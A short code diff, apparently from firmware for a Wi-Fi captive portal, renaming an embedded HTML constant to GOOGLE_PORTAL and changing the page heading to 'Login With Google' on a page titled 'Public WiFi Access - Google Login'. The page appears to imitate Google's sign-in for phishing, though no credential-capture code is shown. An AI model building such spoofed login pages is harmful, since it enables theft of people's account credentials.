@@ -1,4 +1,4 @@
-const char GOOGLE_HTML[] = R"=====(
+const char GOOGLE_PORTAL[] = R"=====(
 <html>
 <head>
       <title>Public WiFi Access - Google Login</title>
@@ -158,7 +158,7 @@ transition: opacity 0.075s;
 <div class='logo' aria-label='Google'></div>
 <div class='banner'>
 <h1>
-Entra con Google e inizia a navigare ora
+Login With Google
 </h1>
 <h2 class='hidden-small'>
 Sign in to continue
